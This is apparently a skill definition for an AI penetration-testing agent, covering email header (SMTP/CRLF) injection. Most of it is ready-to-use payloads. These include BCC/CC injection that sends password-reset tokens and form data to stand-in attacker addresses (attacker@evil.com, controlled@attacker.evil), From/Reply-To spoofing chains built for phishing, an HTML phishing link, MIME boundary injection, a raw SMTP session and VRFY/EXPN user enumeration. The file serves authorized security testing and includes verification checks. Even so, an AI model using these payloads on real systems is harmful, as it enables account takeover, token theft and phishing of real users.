---
name: email-injection
description: "Email header injection (SMTP injection) exploitation for header manipulation, email spoofing, and data exfiltration"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive]
triggers: ["email injection", "smtp injection", "header injection", "email header", "mail header", "smtp header", "email spoofing injection", "email subject injection", "email body injection", "mail injection"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1566"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
---

# Email Header Injection (SMTP Injection)

## When to Use

- Contact forms that send emails (PHP `mail()`, Python `smtplib`, Node `nodemailer`)
- Newsletter signup forms with name/email fields
- Password reset flows with user-controlled input fields
- Any form that constructs email headers from user input
- "Invite a friend" or "Share this page" features
- Feedback or support ticket submission forms

## Do Not Use

- Forms that only accept a single email field with no additional headers
- Server-side libraries that properly sanitize CRLF characters before header construction
- Forms where the subject/body is hardcoded and not derived from user input
- Rate-limited or CAPTCHA-protected forms without a bypass path

## Auth Context

Email injection often overlaps with authentication flows:
- **Password reset poisoning**: Inject a second recipient to steal reset tokens via BCC
- **Account takeover pivots**: Forge reset emails to attacker-controlled addresses
- **Session hijacking**: Inject session tokens into forwarded email bodies
- SMTP AUTH bypass is separate from header injection — test both when mail server is accessible

---

## SMTP Header Injection

Inject CRLF (`\r\n`) sequences into form fields that become email headers. When the server concatenates user input into headers without sanitization, attackers can append arbitrary SMTP headers.

### Standard Payloads

Raw CRLF sequences to inject into any header-mapped field (replace `%0d%0a` with the encoding the form accepts):

```text
\r\nBcc: attacker@evil.com
\r\nCc: attacker@evil.com
\r\nTo: victim@target.com, attacker@evil.com
\r\nSubject: Injected Subject
\r\nFrom: admin@target.com
\r\nReply-To: attacker@evil.com
\r\nInjected-Header: test
```

URL-encoded variants for HTTP form fields:

```http
POST /contact HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Test%0d%0aX-Test-Injected:%20yes&email=victim@target.com&subject=Hi&message=Hello
```


### Injection Points

| Field | Injection Target | Technique |
|-------|-----------------|-----------|
| Name / Username | From header manipulation | `\r\n` in display name |
| Subject | Subject header split | `\r\nSubject: New` |
| Email | From/Reply-To override | `\r\nFrom: admin@target.com` |
| Message / Body | Body injection or header append | Multi-line CRLF chains |
| CC / BCC fields | Blind recipient addition | Append addresses |

---

## CRLF Injection in Email

CRLF injection in email contexts allows adding hidden recipients (BCC) or injecting content types that change how the email client renders the message.

### BCC Injection — Hidden Recipients

```http
POST /contact HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Test%0d%0aBcc:%20attacker@evil.com&email=victim@target.com&subject=Quote%20Request&message=Hello
```

Single-field variant (email field itself carries the CRLF chain):

```http
email=victim@target.com%0d%0aBcc: attacker@evil.com
```


- BCC recipients are not visible in the email headers displayed to recipients
- The original recipient sees a normal email with no trace of the hidden address
- SMTP server must accept the injected BCC without stripping it

### CRLF Chain for Full Header Control

```http
POST /invite HTTP/1.1
Content-Type: application/x-www-form-urlencoded

friend_email=victim@target.com%0d%0aFrom:%20admin@target.com%0d%0aReply-To:%20attacker@evil.com%0d%0aSubject:%20Urgent:%20Account%20Verification%20Required%0d%0aX-Priority:%201%0d%0aX-Mailer:%20CorporateMailer&your_name=IT%20Support
```


This constructs a complete set of forged headers. The actual envelope sender (MAIL FROM) remains the legitimate server, but displayed headers are attacker-controlled.

### Content-Type Injection

```http
email=victim@target.com%0d%0aContent-Type:%20text/html;%20charset=UTF-8%0d%0aContent-Transfer-Encoding:%20base64&subject=Hello
```

Force HTML rendering, or smuggle a second MIME part via boundary injection (see Body Injection below).


---

## Subject Manipulation

Inject newlines in subject fields to replace the intended subject or add custom headers like `Reply-To`, `X-Priority`, or `List-Unsubscribe`.

### Payloads

```http
subject=Hello%0d%0aReply-To:%20attacker@evil.com
subject=Hello%0d%0aX-Priority:%201
subject=Hello%0d%0aList-Unsubscribe:%20<mailto:attacker@evil.com>
subject=Hello%0d%0aInjected-Header:%20test
subject=Real%20Subject%0d%0aSubject:%20Replaced%20Subject
```


### Behavior by Mail Library

| Library | CRLF Handling | Injectable |
|---------|--------------|------------|
| PHP `mail()` | Passes raw to sendmail | Yes |
| PHP `PHPMailer` < 5.2.21 | No header filtering | Yes |
| Python `smtplib` | Validates headers | Partial |
| Node `nodemailer` | Sanitizes by default | No (modern) |
| Java `javax.mail` | Filters CRLF | No (since JavaMail 1.4) |

---

## Email Spoofing

Forge `From`, `Reply-To`, `Return-Path`, or `Sender` headers to impersonate trusted addresses. The attacker controls what the recipient sees as the sender.

### Spoofed Headers

```http
email=victim@target.com%0d%0aFrom:%20ceo@target.com%0d%0aReply-To:%20attacker@evil.com
email=victim@target.com%0d%0aFrom:%20it-security@target.com%0d%0aSender:%20attacker@evil.com
email=victim@target.com%0d%0aReturn-Path:%20attacker@evil.com
```


### Trust Escalation Chain

1. Spoof `From:` as internal admin → recipient trusts the email
2. Include `Reply-To: attacker@` → replies go to attacker
3. Add `X-Mailer: CorporateMailer` → mimic internal tools
4. Inject `X-Priority: 1` → marks as urgent, bypasses casual review

### SPF/DKIM Bypass Note

Header injection does NOT bypass SPF/DKIM — the envelope sender (MAIL FROM) remains legitimate. However, many email clients display the From header, not the envelope, making the spoof visible to humans even if technically unauthenticated.

---

## Body Injection

Inject HTML, scripts, or additional MIME parts into the email body via CRLF sequences or boundary manipulation.

### HTML Body Injection

```http
POST /feedback HTTP/1.1
Content-Type: application/x-www-form-urlencoded

comment=Regards%0d%0a%0d%0a<html><body><a%20href="http://evil.com/phish">Reset%20your%20password%20now</a></body></html>&email=feedback@target.com&subject=Feedback
```


### MIME Boundary Injection

```http
message=Part%20one%0d%0a--BOUNDARY%0d%0aContent-Type:%20text/html;%20charset=UTF-8%0d%0a%0d%0a<h1>Injected%20HTML%20part</h1>%0d%0a--BOUNDARY--
```

The injected boundary terminates the legitimate part early and appends an attacker-controlled part that mail clients render.


### Attachment Injection (MIME)

```http
filename="invoice.pdf%0d%0aContent-Type:%20text/html%0d%0aContent-Disposition:%20inline"
filename="notes.txt%0d%0aContent-Transfer-Encoding:%20base64"
```


---

## Blind Email Exfiltration

Use injection to CC/BCC an attacker-controlled address, exfiltrating data from password reset flows, session tokens, or form submissions.

### Password Reset Token Exfiltration

```http
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com%0d%0aBcc:%20controlled@attacker.evil
```


- When the server sends a password reset email with a token in the body or URL
- The attacker receives a copy of the email with the reset token
- Combined with spoofed From header, the legitimate user may not notice

### Exfiltration via Contact Form

```http
POST /contact HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Website%20Visitor%0d%0aCc:%20controlled@attacker.evil&email=visitor@example.com&subject=Question&message=Form%20submission%20content
```

Every form submission is silently copied to the attacker.


### Data Extraction from Web Apps

- Inject `BCC:` in newsletter signup → receive all subscriber activity
- Inject `CC:` in support ticket submission → receive all tickets
- Inject in "share this page" forms → exfiltrate page content via email body

---

## Attachment Upload Abuse

If email forms allow file attachments or file names are embedded in headers:

### Filename Header Injection

```http
POST /support/ticket HTTP/1.1
Content-Type: multipart/form-data; boundary=----form

------form
Content-Disposition: form-data; name="attachment"; filename="report.pdf%0d%0aBcc:%20attacker@evil.com"
Content-Type: application/pdf

<file bytes>
------form--
```


### Malicious Attachment Relay

- Upload `.html` or `.eml` attachments through email forms
- If server processes attachments, inject `.ics` calendar invites
- Forward malicious attachments to internal recipients via BCC injection

---

## SMTP Command Injection

If the application directly issues SMTP commands (not using a library), inject SMTP protocol commands:

### DATA Phase Injection

```text
$ telnet mx.target.com 25
220 mx.target.com ESMTP Postfix
MAIL FROM:<noreply@target.com>
250 Ok
RCPT TO:<victim@target.com>
250 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
From: admin@target.com
To: victim@target.com
Bcc: attacker@evil.com
Subject: Password Reset
X-Injected-Header: test

Your reset link: https://target.com/reset?token=SECRET
.
250 Ok: queued as 8F2A1
QUIT
```

### SMTP AUTH Bypass Attempt

```text
AUTH PLAGUE AGF0dGFjawBwYXNzd29yZA==      ← AUTH PLAIN base64(user\0pass), attempt mid-stream
MAIL FROM:<other-user@target.com>          ← relay as a different identity if server trusts session
```

Base64 payload is `AUTH PLAIN <base64("\0user\0password")>` — try captured or default credentials.

### SMTP VRFY/EXPN Abuse

```text
$ telnet mail.target.com 25
VRFY root
252 2.0.0 root
VRFY admin
550 5.1.1 <admin>: Recipient address rejected
EXPN all
250 2.1.5 alice@target.com,bob@target.com
```

`VRFY` confirms mailbox existence (user enumeration); `EXPN` expands lists/mailing aliases where supported.


---

## Testing Methodology

### Step 1: Identify Email-Sending Functions

- Search for contact forms, signup forms, password reset, "share" features
- Inspect HTTP requests for email-related fields: `email`, `name`, `subject`, `message`, `to`, `cc`
- Check if server response includes mail headers (`X-Mailer`, `Message-ID`, `Received`)

### Step 2: Test for CRLF Injection

```http
POST /newsletter HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=you@test.local%0d%0aX-Test-Injected:%20crlf-works&name=Tester
```

Then inspect the raw source of the received email (`View original` / `Show headers`) for `X-Test-Injected`.


- Submit `test\r\nInjected-Header: test` in each field
- Check response headers and email received for `Injected-Header`
- If reflected in email, the field is injectable

### Step 3: Escalate to Exfiltration

- Inject `BCC: your-test@attacker.com`
- Confirm the blind copy is received
- Test if the original recipient sees the BCC (should not, but verify)

### Step 4: Header Forge

- Inject complete `From:` / `Reply-To:` / `Subject:` headers
- Verify which headers are accepted by the SMTP server
- Some servers strip or reject malformed headers — test incrementally

### Step 5: Body Injection

- Inject HTML content after CRLF sequences
- Test if the email client renders injected HTML
- Test MIME boundary injection if the server uses multipart

### Step 6: SMTP Command Injection

- If SMTP connection details are known, test command injection
- Monitor SMTP server logs for injected commands
- Test AUTH injection if credentials are known

### Forms to Test

| Form Type | Key Fields | Risk Level |
|-----------|-----------|------------|
| Contact form | name, email, subject, message | High |
| Newsletter signup | email, name | Medium |
| Password reset | email | Critical |
| Invite friend | friend_email, your_name | High |
| Support ticket | subject, description, attachment | High |
| Feedback form | rating, comment, email | Medium |
| Registration | username, email | Medium |

---

## Anti-Hallucination

Before reporting an email injection finding, verify ALL of the following with tool output:

- **CRLF injection confirmed**: Submit a payload containing `\r\n` and confirm the injected header appears in the received email or SMTP log. Do NOT claim injection based solely on input reflection.
- **BCC/CC delivery confirmed**: If claiming data exfiltration via blind copy, confirm the attacker address received the email. Empty responses or bounced messages do NOT confirm vulnerability.
- **No server-side sanitization**: Many modern frameworks (Laravel, Django, Rails) strip CRLF from email headers automatically. Verify the library version and behavior before claiming vulnerability.
- **Library behavior verified**: `nodemailer` (Node), `javax.mail` (Java), and modern `PHPMailer` sanitize CRLF. Do NOT assume vulnerability without testing the actual mail library in use.
- **SMTP server acceptance**: Even if CRLF passes the application layer, the SMTP server may reject malformed headers. Check SMTP error codes (5xx responses).
- **SPF/DKIM is separate**: Header injection does NOT bypass email authentication. Do NOT claim "complete email spoofing" — only claim header manipulation in the MUA display layer.
- **No false positives from test email clients**: Test email content in the target's actual email client, not just a mail log. Some clients strip or re-encode headers.

## Trigger Conditions

Activate on any form or endpoint that constructs and sends email from user-supplied input: contact/feedback forms, support tickets, newsletter signups, password-reset and "invite a friend" flows, "share this page" features, and profile fields that appear in outgoing mail (display name, subject previews). Trigger when request parameters map to email headers (`name`, `email`, `subject`, `message`, `to`, `cc`, `reply-to`). Do not trigger on APIs that queue messages via backend-only templating with no user-controlled header values.

## Detection Approach

Reason as: does any field reach a raw header line? Start by injecting a CRLF sequence followed by a benign custom header (`X-Test-Injected`) into each header-mapped field; inspect either the received email's raw source or SMTP transaction logs for the injected header. If present, the field is injectable. Escalate incrementally: first add a visible `Reply-To`/second recipient to confirm header append, then attempt BCC to a controlled address for blind exfiltration — confirm receipt at that address before claiming data loss. Next attempt full `From`/`Subject` forgery to assess spoofing in the display layer. Test the message body separately via content-type/multipart injection only after header injection is proven, since body handling differs by library. Finally, if the app speaks SMTP directly (not via a library), probe for mid-stream command injection. If no injected header ever appears, verify whether the framework strips CRLF (Laravel/Django/Rails/nodemailer sanitize by default) before concluding non-vulnerable.

## Pitfalls

- Claiming injection from input reflection alone — the payload must appear in the *email's header*, not just echoed in the page.
- Assuming CRLF passes the app means the mail server accepts it; many MTAs reject malformed headers (5xx), giving a false sense of success.
- Overclaiming "email spoofing" — header injection alters displayed From but does not defeat SPF/DKIM; restricted to MUA display layer.
- Ignoring framework CRLF sanitization; modern libraries neutralize most injection, so untested assumptions yield false positives.
- Treating a test mailbox receipt as representative of the victim's client without checking header rewriting/stripping.
- Firing BCC exfiltration against live password-reset flows without a controlled address risks leaking real tokens to yourself — scope carefully.

## Verification & Impact

CONFIRMED when an injected header (`X-Test-Injected`, `BCC`, forged `From`) is observed in the received email's raw source OR an SMTP log shows the injected command, and — for exfiltration — the attacker-controlled address actually receives the message. SUSPECTED when the app accepts CRLF but you cannot observe the delivered mail (e.g., no mailbox access); record the request/response and flag for confirmation. Document impact by what the injection enables: header manipulation/spoofing (phishing lever), blind CC/BCC exfiltration of tokens/PII (account takeover pivot), body/MIME injection (HTML/attachment delivery), or SMTP command injection (relay abuse). Capture full request/response pairs via `recordEvidence`.
